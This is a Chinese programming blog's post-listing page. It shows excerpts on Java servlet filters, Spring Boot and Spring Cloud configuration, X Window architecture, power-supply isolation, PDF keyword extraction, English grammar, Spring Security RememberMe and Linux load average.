<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f58942bcc264a26b87c5567e8b744710/" rel="bookmark">
			Filter过滤器及其作用介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、过滤器Filter 1．filter的简介 filter是对客户端访问资源的过滤，符合条件放行，不符合条件不放行，并且可以对目 标资源访问前后进行逻辑处理
2．Filter的API详解 (1)filter生命周期及其与生命周期相关的方法 Filter接口有三个方法，并且这个三个都是与Filter的生命相关的方法
init(Filterconfig)：代表filter对象初始化方法 filter对象创建时执行
doFilter(ServletRequest,ServletResponse,FilterChain)：代表filter执行过滤的核心方法，如果某资源在已经被配置到这个filter进行过滤的话，那么每次访问这个资源都会执行doFilter方法
destory()：代表是filter销毁方法 当filter对象销毁时执行该方法
Filter对象的生命周期：
Filter何时创建：服务器启动时就创建该filter对象
Filter何时销毁：服务器关闭时filter销毁
(2)Filter的AP详解 1）init(FilterConfig)
其中参数config代表 该Filter对象的配置信息的对象，内部封装是该filter的配置信息。
@Override
//初始化方法：Filter创建时去执行init方法
public void init(FilterConfig filterConfig) throws ServletException {
//1、获得web.xml中filter 的名称 &lt;filter-name&gt;QuickFilter1&lt;/filter-name&gt;
System.out.println(filterConfig.getFilterName());
//2、还能获得当前filter的一些初始化参数
System.out.println(filterConfig.getInitParameter("aaa"));
//3、获得servletContext
filterConfig.getServletContext();
System.out.println("init....");
}
2）destory()方法
filter对象销毁时执行
3）doFilter方法
doFilter(ServletRequest,ServletResponse,FilterChain)
其中的参数：
ServletRequest/ServletResponse：每次在执行doFilter方法时 web容器负责创建一个request和一个response对象作为doFilter的参数传递进来。该request个该response就是在访问目标资源的service方法时的request和response。
FilterChain：过滤器链对象，通过该对象的doFilter方法可以放行该请求
4、Filter的配置
&lt;filter&gt;
&lt;filter-nameFilter1&lt;/filter-name&gt;
&lt;filter-class&gt;com.filter.Filter1&lt;/filter-class&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
&lt;filter-name&gt;Filter1&lt;/filter-name&gt;
&lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt; 5、url-pattern配置时
1）完全匹配 /sertvle1
2）目录匹配 /aaa/bbb/* ----最多的
/user/*：访问前台的资源进入此过滤器
/admin/*：访问后台的资源时执行此过滤器
3）扩展名匹配 *.abc *.jsp
注意：url-pattern可以使用servlet-name替代，也可以混用
6、dispatcher：访问的方式(了解)
配置格式为：&lt;dispather&gt;*&lt;/dispather&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f58942bcc264a26b87c5567e8b744710/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b57daa21155098b22d9c4272665fbab/" rel="bookmark">
			SpringBoot生产环境打包去除无用依赖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、去除在生产环境中不变的依赖第三方jar包 pom.xml中添加：
&lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;layout&gt;ZIP&lt;/layout&gt; &lt;!--去除在生产环境中不变的依赖--&gt; &lt;excludeGroupIds&gt; org.springframework.boot, org.springframework, org.springframework.data, com.fasterxml.jackson.core, com.fasterxml.jackson.databind, org.apache.commons, org.apache.tomcat.embed, org.hibernate.validator, org.slf4j, com.jayway, org.jboss, com.alibaba, com.fasterxml, com.fasterxml.jackson.datatype, com.fasterxml.jackson.module, ch.qos.logback, org.yaml, org.jboss.logging, javax.validation, io.netty, org.apache.httpcomponents, org.apache.logging.log4j, org.aspectj, javax.annotation, io.lettuce, commons-codec, org.reactivestreams, io.projectreactor &lt;/excludeGroupIds&gt; &lt;/configuration&gt; &lt;/plugin&gt; 2、去除生产环境配置文件依赖 pom.xml中添加：
&lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;excludes&gt; &lt;exclude&gt;*&lt;/exclude&gt; &lt;/excludes&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27c170ca4c2b3b70bf14f84f19289d05/" rel="bookmark">
			什么是xserver和xclient
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在xwindows体系中，提供界面显示，响应外设操作的是xserver，而运行程序业务逻辑，接受xserver发来的各种事件通知的，是xclient。
当xclient和xserver 在同一台机器上的时候，这种情况下，应用程序调用xclient的接口请求xserver为创建窗口，应用程序可以通过xlib库的过程调用请求xserver创建窗口中子元素，例如滑动条，按钮等。而xserver的作用是提供在屏幕上绘制基础元素的功能，例如填色，画线，画圆等动作，xserver会通过调用底层驱动程序完成这些功能。而xclient通过x协议向xserver发送请求去完成对应的界面操作。
下面是网上一个说的比较清楚的例子：
如果从一台 XP上用Reflection通过 XDMCP 登录到一台 Linux服务器，我们很容易将Reflection当成客户端，而将Linux机器当成服务器。这就完全搞错了。理解了Xwindow的工作原理，这个区别就会很明显。X server 不是指某台机器，而是指一个进程，它负责接受客户的要求，在屏幕上显示客户请求的图形，并且把消息(键盘，鼠标，窗口消息)通知客户程序。比如上面说的Reflection，它其实是才是Xserver，它负责控制那台XP上的显示，Linux机器上的程序，xterm, xxgdb, dtwm(CDE的窗口管理器)，……是客户程序。它们通常会使用TCP 6000 号端口连接XP，而XP的6000号端口是由Reflection绑定并侦听的，显然这里Reflection才是Xserver。比如，当你通过telnet 启动Linux机器上的xterm，就会在Reflection 的屏幕上显示一个窗口。实际发生的事情是：xterm 请求连接XP的6000 号端口和Reflection，跟Reflection建立连接，然后xterm请求得到资源，然后xterm 请求在屏幕上显示一个窗口。当在xterm 的窗口里按下”A”键时，Reflection 会把这个事件通知 xterm 进程，然后xterm 会发送数据报，请求Reflection, “请在坐标(100,30)处显示一个字母A，然后在后面显示一个矩形作为光标。” 这样xterm 窗口里就会多显示一个字母。至于KDE和Gnome，他们是桌面系统不是Xwindow，他们只是一些运行在Xwindow上的程序，他们发出要显示什么东西的请求，比如要在桌面底部显示一个面板、在桌面显示些图标。
http://blog.sina.com.cn/s/blog_4e415c0b0100lulu.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f960907e56e0327eb3e31e3024a7da8/" rel="bookmark">
			Spring Cloud之Eureka客户端健康检测(五)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在前面的博客中，我们知道一个最简单的Eureka微服务架构，也要由3个项目组成，当项目增多的时候，Eureka是怎么维护服务的呢？如何确保其中一个服务实例不能使用了，将它排除出去呢？
由于整个演示过程还是Eureka的内容，我们首先从Spring Cloud服务管理框架Eureka简单示例(三)文章底部的源码链接拿到我们的示例代码。
客户端心跳推送与检测 Eureka分为服务器端和客户端，客户端每隔一段时间就会向服务器端发送一次讯息，向服务器说明自己还正常，让服务器端继续维护自己的服务，不要从服务列表里面把自己给剔除了。同时，设置一个让服务器端等待自己的时间，当自己的服务实例没有继续为服务器端发送心跳后，也就是从最后一次发送心跳开始计时，等待一段时间，依然没有收到讯息，服务器端就会把这个服务实例从服务列表里面移除，不再让流量涌入这个服务实例。
eureka.instance.lease-renewal-interval-in-seconds
表明客户端需要将心跳发送到服务器端，以表明它还活着。如果心跳停止的时间超过了服务器设置的等待时间，那么服务器端将会从它的服务列表中删除该实例，从而将流量排除在该实例之外。默认30s
eureka.instance.lease-expiration-duration-in-seconds
服务器端等待的时间，因为它收到了最后的心跳，然后才可以从它的视图中删除这个实例，并且不允许流量进入这个实例。将这个值设置得太长可能意味着，即使实例不存在，流量也可以被路由到实例。将这个值设置得太小可能意味着，由于临时网络故障，该实例可能会被排除在流量之外。这个值的设置至少要高于leaseRenewalIntervalInSeconds中指定的值。默认90s
我们通过修改这些配置，查看运行结果，去直观地理解这些配置。首先运行euraka-server项目com.init.springCloud包下面的ServerApp类main()方法，启动Eureka服务器端。然后，修改eureka-provider项目application.yml文件，把leaseRenewalIntervalInSeconds的时间改成5s，为了能够看到项目发送的心跳讯息，我们把Eureka的log日志打开，在控制台看输出结果。application.yml配置如下：
spring: application: name: eureka-provider eureka: instance: leaseRenewalIntervalInSeconds: 5 client: serviceUrl: defaultZone: http://localhost:8761/eureka/ logging: level: com.netflix: DEBUG 然后运行eureka-provider项目ProviderApp类的main()方法，项目启动成功之后，我们就能够在控制台看到打印出来的日志信息。我这里截取一段5s内的日志，为了方便观察，去掉了最前面的时间：
[{}-&gt;http://localhost:8761] total kept alive: 1, total issued: 0, total allocated: 1 out of 200 Getting free connection [{}-&gt;http://localhost:8761][null] Released connection is reusable. Releasing connection [{}-&gt;http://localhost:8761][null] Pooling connection [{}-&gt;http://localhost:8761][null]; keep alive indefinitely Notifying no-one, there are no waiting threads Jersey HTTP PUT http://localhost:8761/eureka//apps/EUREKA-PROVIDER/DESKTOP-E3UNJK3:eureka-provider; statusCode=200 DiscoveryClient_EUREKA-PROVIDER/DESKTOP-E3UNJK3:eureka-provider - Heartbeat status: 200 浏览器访问http://localhost:8761，在Eureka的控制台也能够看见注册到服务器端的项目。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f960907e56e0327eb3e31e3024a7da8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/755af54daa819c401a1a78d6184ea635/" rel="bookmark">
			开关电源：选择隔离电源还是非隔离电源（转）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、电源隔离与非隔离的概念 电源的隔离与非隔离，主要是针对开关电源而言，业内比较通用的看法是： ①隔离电源：电源的输入回路和输出回路之间没有直接的电气连接，输入和输出之间是绝缘的高阻态，没有电流回路。
②非隔离电源：输入和输出之间有直接的电流回路，例如，输入和输出之间是共地的。
二、隔离电源与非隔离电源的优缺点
由上述概念可知，对于常用的电源拓扑而言，非隔离电源主要有：Buck、Boost、Buck-Boost等;而隔离电源主要有各种带隔离变压器的反激、正激、半桥、LLC等拓扑。
结合常用的隔离与非隔离电源，我们从直观上就可得出它们的一些优缺点，两者的优缺点几乎是相反的。
使用隔离或非隔离的电源，需了解实际项目对电源的需求是怎样的，但在此之前，可了解下隔离和非隔离电源的主要差别：
①隔离模块的可靠性高，但成本高，效率差点。
②非隔离模块的结构很简单，成本低，效率高，安全性能差。
因此，在如下几个场合，建议用隔离电源：
①涉及可能触电的场合，如从电网取电，转成低压直流的场合，需用隔离的AC-DC电源；
②串行通信总线通过RS-232、RS-485和控制器局域网(CAN)等物理网络传送数据，这些相互连接的系统每个都配备有自己的电源，而且各系统之间往往间隔较远，因此，我们通常需要隔离电源进行电气隔离来确保系统的物理安全，且通过隔离切断接地回路，来保护系统免受瞬态高电压冲击，同时减少信号失真；
③对外的I/O端口，为保证系统的可靠运行，也建议对I/O端口做电源隔离。
三、隔离与非隔离电源的应用场合
通过了解隔离与非隔离电源的优缺点可知，它们各有优势，对于一些常用的嵌入式供电选择，我们已可做成准确的判断：
①系统前级的电源，为提高抗干扰性能，保证可靠性，一般用隔离电源。
② 电路板内的IC或部分电路供电，从性价比和体积出发，优先选用非隔离的方案。
③ 对安全有要求的场合，如需接市电的AC-DC，或医疗用的电源，为保证人身的安全，必须用隔离电源，有些场合还必须用加强隔离的电源。
④ 对于远程工业通信的供电，为有效降低地电势差和导线耦合干扰的影响，一般用隔离电源为每个通信节点单独供电。
⑤ 对于采用电池供电，对续航力要求严苛的场合，采用非隔离供电。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae86f003a00470916e81d6aed03abc95/" rel="bookmark">
			Java的compareTo() 方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		compareTo() 方法用于将 Number 对象与方法的参数进行比较。用于两个相同数据类型的比较，两个不同类型的数据不能用此方法来比较。
如果指定的数与参数相等返回0
如果指定的数小于参数返回 -1
如果指定的数大于参数返回 1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eec42c81dd40874503957ac686e20e25/" rel="bookmark">
			打造个人版微信小程序（1）——本地开发api接口调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果觉得这篇文章对您有所启发，欢迎关注我的公众号，我会尽可能积极和大家交流，谢谢。 从今天开始，开始打造一个个人版的微信小程序，尽早上线，方便大家使用以及技术讨论。这套小程序包括前台、后台、数据库等部分，估计需要花些时间了。 小程序开发在入门阶段直接参照官方的帮助文档即可，包括基本语法（和Vue.js大同小异）、开发工具（腾讯提供了一个小的开发工具）等，官方文档：微信小程序开发。 小程序开发自然而然分为前台后台，前台程序的入门参照官方文档，后台程序则需要自己搭建了。主要问题是微信小程序要求内部调用的API接口必须都是https的，并且最好是带域名，因此需要在搭建后台的时候费点功夫，整体后台基本流程如下： 1 选用API接口。想让产品能够吸引用户来用，首先得要求其有一些实实在在的功能，这就需要对应业务的API接口了。2 Springboot统一后台。整合用到的api业务接口，同时支撑一些自定义功能（如登录注册等）3 云服务器、域名、SSL证书：后台部署的媒介，同时负责将http接口转换为https接口4 Nginx反向代理：将域名和IP绑定，以https的形式提供给前端程序调用5 微信小程序：前端 1 API市场 1.1 API市场 有多少程序员在入门的时候都写过天气预报的demo?这就是一个最简单的数据API。目前在市面上有很多API接口可供大家调用，有付费的也有免费的，这里举两个例子：聚合数据、阿里云API市场。这两个市场的优缺点我并没有仔细研究。 这里以阿里云API市场中的天气预报API接口为例来做：天气预报API接口。
1.2 购买API 首先，需要先购买该API接口之后才能调用，即使是表明免费的接口也需要进行购买操作，否则无法进行调用。这里有很多便宜且实用的接口，如天气预报、快递查询、驾照查分、身份证识别等等，具体如何组合使用还是取决于我们对产品发展的设想： 以天气预报查询为例，我们在登录阿里云账号（支付宝可以直接登录）并购买对应API接口之后，在对应的控制台中可以查看到该接口的AppCode、AppKey、AppSecret，这些都是我们对该接口的调用凭证，在调用时是需要放到header中上传的： 1.3 测试API 在API购买完成之后，我们需要测试一下这个接口的可用性，我这里使用postman来测试一下，对应的调用方式在文档中已经都明确说明过了：天气预报API接口 调用地址见文档，调用方式为get请求，请求头中写入AppCode做身份认证，添加城市名称作为请求参数，测试如下： 具体身份认证方式见文档：Appcode简单认证
2 搭建Springboot 2.1 IDE 这里选用IntelliJ IDEA，IntelliJ IDEA是付费最好的java编辑器，eclipse是免费最好的java编辑器。为了方便springboot项目的新建和编写，这里推荐下载两个插件，即GsonFormat和Spring Assistant： 2.2 新建springboot项目 Spring Assistant能够方便快速的新建一个springboot项目：“file”-&gt;“new”-&gt;“project”-&gt;“Spring Assistant”，按照提示一步步创建SpringBoot项目即可。有一点需要说明的就是，这里默认通过maven来构建项目以及依赖包的管理，IDEA默认是国外的maven仓库地址，第一次构建下载相应的jar包时会相当慢，需要转换到国内镜像来下载，具体如下：maven国内镜像地址； 在新建Springboot项目时，记得选中web的依赖，后续在使用网络请求的时候会用到这个依赖： 数据库的依赖这里先不要选，等用到的时候再添加即可，不然程序启动不起来。程序新建完成之后，找到对应的Application入口，右键debug它： 也可以通过“shift+alt+F9”快捷键来实现debug，控制台输出一下内容，说明程序启动正常： 2.3 集成swagger接口文档 Swagger是一种Rest API的 简单但强大的表示方式，这里应用知乎上的一篇文章作为介绍：swagger简介。接下来，我们要在新建的springboot项目中将swagger集成进来。 1、在项目的pom.xml文件中添加swagger相关依赖：
&lt;!-- Swagger --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt; &lt;/dependency&gt; 每次修改pom文件时，系统在右下角有所提示，点击“import change”即可完成相关依赖包的添加。 2、在和Application同级的目录中，新建名为“Swagger2”的类： swagger2文件中的代码如下：
@Configuration @EnableSwagger2 public class Swagger2 { private String BASE_PACKAGE = Swagger2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eec42c81dd40874503957ac686e20e25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72dc6872cfdceac9d2019ae6e97958d0/" rel="bookmark">
			SpringBoot启动banner更改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章的开始先给大家看一个图片
用过或者看过springboot的人都知道，这就是springboot启动的banner，这一篇介绍如何自定义springboot的启动bannner。
先介绍一个可以制作自定义banner的网站，传送门：http://patorjk.com/software/taag/#p=display&amp;f=Graffiti&amp;t=Type%20Something%20
黄框内输入自定义文字，红框内填写字体，本文使用banner
___ _ _ _ ____ _ _ _ _ _ ___ F __". /.\ FJ /.\ F __ ] FJ LJ /.\ F L L] ,"___". J |--\ L //_\\ J | //_\\ J |--| L J \/ F //_\\ J \| L FJ---L] | | J | / ___ \ | | / ___ \ | | | | J\ /L / ___ \ | |\ | J | ["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72dc6872cfdceac9d2019ae6e97958d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9e53bf3a5f1e1583c9119cf45d2612f/" rel="bookmark">
			提取PDF关键字并写入Excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者博客地址：https://www.yooongchun.cn/
摘要：这篇文章介绍如何从PDF文件中提取关键字，然后写入到Excel中。首先程序把PDF解析为txt文件，然后程序从指定的Excel文件中加载关键字，再在txt中去寻找，最后将找到的关键字个数写入Excel
功能演示 需求描述：在我的keywordsExtractor 目录下有一些文件夹，文件夹内是pdf文件，我需要把这些pdf文件跟目标股票进行对比，如果该PDF属于目标股票，那么加载，否则不加载。然后把PDF中的一些特定关键词出现次数提取到Excel中，如下示例： 关键词从D列开始，任意添加。其中A1，B1，C1内容可以更改。
然后运行程序，得到的结果示例如下： 这里的年份是PDF所在文件夹的名称，你可以自己修改，股票代码是PDF文件名称的前6个字符。 实现过程
STEP 0: 加载需要的包
# -*- coding: UTF-8 -*- """ 1.加载一个指定路径文件夹内的所有pdf文内容 2.解析所有pdf内容并提取指定内容 3.把解析出来的指定内容写入Excel表格 """ ################# import xlwt # 写入文件 import xlrd # 打开excel文件 from xlutils.copy import copy import os import re import sys import importlib importlib.reload(sys) from pdfminer.pdfparser import PDFParser, PDFDocument from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter from pdfminer.converter import PDFPageAggregator from pdfminer.layout import LTTextBoxHorizontal, LAParams from pdfminer.pdfinterp import PDFTextExtractionNotAllowed import logging logging.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9e53bf3a5f1e1583c9119cf45d2612f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/860dd755b6f81fc461c454e862244dfe/" rel="bookmark">
			钟平程序员逻辑英语——回归理性——中英文对切基本公式（1-1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公式的运行和词汇语法重建
一个公式破解天下句子
我们将完成一个数据模型去重构句子体系，这是一个接近理科的思想，就是集合论的思想，从集合的角度我们发现两种语言之间本质上是排序不同，单词是对称的么，我们先假设你都认识单词了，语法也都懂了，先不管这些问题，先完成这个逻辑的重建，我们会发现中文和英文的单词是一样的，中文有书英文就有Book，他是一个对称体系，差别在于，外语的排列方式和中文是不一样的，我们中国各地的方言排序是一样的吧，都是一回事，没任何区别只是发音不同，那么排序是对构成语言的本质差别。比如日语的写法几乎和中文一样，但是他是外语，因为他的排序和中文不一样，虽然两种语言的排序是不同的但是每种语言有他固定的排序方式，为此我们做了一个思想体系，去完成两种语言的固定排序逻辑，把中文和英文这个排序过程把改造成这个f(x)=y，就是类似于这个函数过程，让它能通过这个模式去解决全部的问题，当然这个模式是怎么产生的呢，我们将跟大家解释这个模式是怎么产生的呢，我将跟大家解释这个公式的造型来历。
第一步：公式的推导和基础运行
( 状 1）主（定1 ）谓（状2 ）（宾）（定2 \状1）
上边这行是天下全部英文的陈述逻辑，为什么我们只看陈述逻辑呢，因为那些疑问感叹陈述倒装，我们在后边会专门讲到怎么处理它，因为中文是没有这些的，中文都是用陈述表达，我们在表达疑问感叹陈述倒装的时候，就加语气虚词，啊哦吗呢哈哈 就可以了，英文不一样，他需要有些变动么，比如把助词提前了， Is this a book 改一改了，为了简化这两种语言的体系呀，我们假设英文也没有，如果他有怎么办呢，就把他提前边去么。我们公式所展示的是天下所有的陈述逻辑，只有简化了句子逻辑你才会恍然大悟否则就会被句子的变化搞混乱了，只看陈述逻辑是因为英文有很多的变型，中文只有陈述，连个疑问句都没有，很多老外学外语纯属于上当受骗，中文是天下所有语言里看一眼觉得最好学的语言，时态没有，句型结构没有，分词没有，介词只有在，什么都没有，这就是中文最难之处什么都没有，只能靠自己琢磨，你能够买到英语，德语语法书，你一定难买到中文语法书。
( 状1\定1）主（状2）谓（定2）（宾）（状1）中文的公式
我 爱 你
去年 我 爱 你
去年 一个胖 丫头 非常热情的 爱上了 瘦瘦的 你
问题一，我们必须要了解这个公式，并没有包含入另外一个东西，就是在任何一句话当中，不论是中文还是英文，都有可能会出现由，；——，加的一串东西+（），这个叫做插入语，为什么我们没有在公式当中把插入语体现出来呢，因为我们知道不论是英文还是中文，这都可以有的，因为它插哪都行，从逻辑上来说，它和原句是没有关系的是独立存在的，如果我们要翻译它就单独翻译就可以了，比如说“这个女孩很漂亮！”This girl is beautiful！这个女孩This girl插入语逗号，in my opinion逗号，is beautiful！in myopinion这种句子他跟原句是没有关系的，中文也一样“在我看来”也是可有可无的，既然如此我们在公式当中并没有去体现它。
问题二，宾语也可以没有，比如She died.她死掉了。没有宾语吧，主语是一定不能没有的比如说祈使句，Come here baby.来呀宝贝。Come here 来呀。这个不是没有主语它是把它省掉了，它是You come here。只不过是你被省掉了而已，主语不能没有他只是被省略了，被省略不等于没有，宾语连省略的机会都没有。
( 状1）主（定1 ）谓（状2 ）（宾）（定2 \状1）
( 状1\定1）主（状2）谓（定2）（宾）（状1)
通过公式我们能看得出来，中文和英文的主干是一致的，状语1就是在句首的状语，在昨天，时间状语，在我心里，地点状语，因为这个原因，原因状语，它意思可能会不一样，它的位置很固定，就是放到句首或者是句尾，那么你看我们的公式句首和句尾有没有区别呢，其实就是个习惯而已，I get up in the morning.In the moring I get up就是一回事。中文放在前边会多一点，也会出现放在后边的可能性，比如：我走了，因为你不爱我。因为你不爱我，所以我要走了是一回事，只是看为了强调谁而已，所以你要了解他是怎么形成这个逻辑的，去年last year（状）我I（主）买brought（谓）一块表a watch（宾）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/860dd755b6f81fc461c454e862244dfe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a391936a3c33f65f07ff087bf4d6382/" rel="bookmark">
			Spring Security实现RememberMe功能以及原理探究
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在大多数网站中，都会实现RememberMe这个功能，方便用户在下一次登录时直接登录，避免再次输入用户名以及密码去登录，下面，主要讲解如何使用Spring Security实现记住我这个功能以及深入源码探究它的原理。
首先，如下图所示为Spring Security实现RememberMe功能的原理图： 首先你进入登录页面，输入用户名以及密码进行登录，通过前几篇文章我们知道了Spring Security首先会进入UsernamePasswordAuthenticationFilter进行验证，如果认证成功它会调用一个叫RememberMeService的类，这个类会调用TokenRepository这个类，而这个类会将一个生成的Token写入数据库中。当你下次再进入该网站的时候，它会直接进入RemeberMeAuthticationFilter这个过滤器中，通过Cookie读取之前的Token，然后拿着这个Token通过RememberService到数据库中查找用户信息，如果存在该Token，则取出该Token对应的用户名以及其他信息放入UserDetailService，然后进入调用的URL。
下面，先来看看如何实现这一功能，最后会通过源码来查看它的实现原理。 Spring Security实现RememberMe功能比较简单。首先定义在配置类中定义一个Repository类进行数据库的读写。实现一个UserServiceDetail类，然后进行相关配置即可。
package cn.shinelon.security.browser; import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.apache.tomcat.jdbc.pool.DataSource; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.security.config.annotation.web.builders.HttpSecurity; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; import org.springframework.security.core.AuthenticationException; import org.springframework.security.core.userdetails.UserDetailsService; import org.springframework.security.crypto.password.PasswordEncoder; import org.springframework.security.crypto.scrypt.SCryptPasswordEncoder; import org.springframework.security.web.authentication.AuthenticationFailureHandler; import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter; import org.springframework.security.web.authentication.rememberme.JdbcTokenRepositoryImpl; import org.springframework.security.web.authentication.rememberme.PersistentTokenRepository; import cn.shinelon.security.authenticate.ImoocAuthenctiationFailureHandler; import cn.shinelon.security.authenticate.ImoocAuthenticationSuccessHandler; import cn.shinelon.security.core.SecurityProperties; import cn.shinelon.security.core.validate.code.ValidateCodeFilter; @Configuration public class BrowserSecurityConfig extends WebSecurityConfigurerAdapter{ @Bean public PasswordEncoder passwordEncoder() { return new SCryptPasswordEncoder(); } @Autowired private DataSource dataSource; //记住我后的登录页面 @Autowired private UserDetailsService userDetailsService; //记住我的功能 @Bean public PersistentTokenRepository getPersistentTokenRepository() { JdbcTokenRepositoryImpl jdbcTokenRepositoryImpl=new JdbcTokenRepositoryImpl(); jdbcTokenRepositoryImpl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a391936a3c33f65f07ff087bf4d6382/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a3a9f2e8249781ca00359b947218fce/" rel="bookmark">
			CPU核数和load average的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者新建了QQ群：460430320，供大家交流测试心得（培训机构勿进）。另外，还会不定期上传测试资料，也欢迎您共享测试资料。
在前面的文章《Linux系统监控——top命令》中我简单提到了，判断load average的数值到底大不大的判断依据，就是数值除以CPU核数，大于5，就说明超负荷运转了。——这里其实不太严谨
今天这篇文章来仔细分析分析，CPU和load average的关系。
转载文章一 我们知道判断一个系统的负载可以使用top，uptime等命令去查看，它分别记录了一分钟、五分钟、以及十五分钟的系统平均负载
例如我的某台服务器：
你可能对于 Linux 的负载均值（load averages）已有了充分的了解。负载均值在 uptime 或者 top 命令中可以看到，它们可能会显示成这个样子：
load average: 1.84, 1.34, 0.68
很多人会这样理解负载均值：三个数分别代表不同时间段的系统平均负载（一分钟、五 分钟、以及十五分钟），它们的数字当然是越小越好。数字越高，说明服务器的负载越大，这也可能是服务器出现某种问题的信号。
而事实不完全如此，是什么因素构成了负载均值的大小，以及如何区分它们目前的状况是 “好”还是“糟糕”？什么时候应该注意哪些不正常的数值？
回答这些问题之前，首先需要了解下这些数值背后的些知识。我们先用最简单的例子说明， 一台只配备一块单核处理器的服务器。
行车过桥
一只单核的处理器可以形象得比喻成一条单车道。设想下，你现在需要收取这条道路的过桥费 — 忙于处理那些将要过桥的车辆。你首先当然需要了解些信息，例如车辆的载重、以及 还有多少车辆正在等待过桥。如果前面没有车辆在等待，那么你可以告诉后面的司机通过。 如果车辆众多，那么需要告知他们可能需要稍等一会。
因此，需要些特定的代号表示目前的车流情况，例如：
0.00 表示目前桥面上没有任何的车流。 实际上这种情况与 0.00 和 1.00 之间是相同的，总而言之很通畅，过往的车辆可以丝毫不用等待的通过。
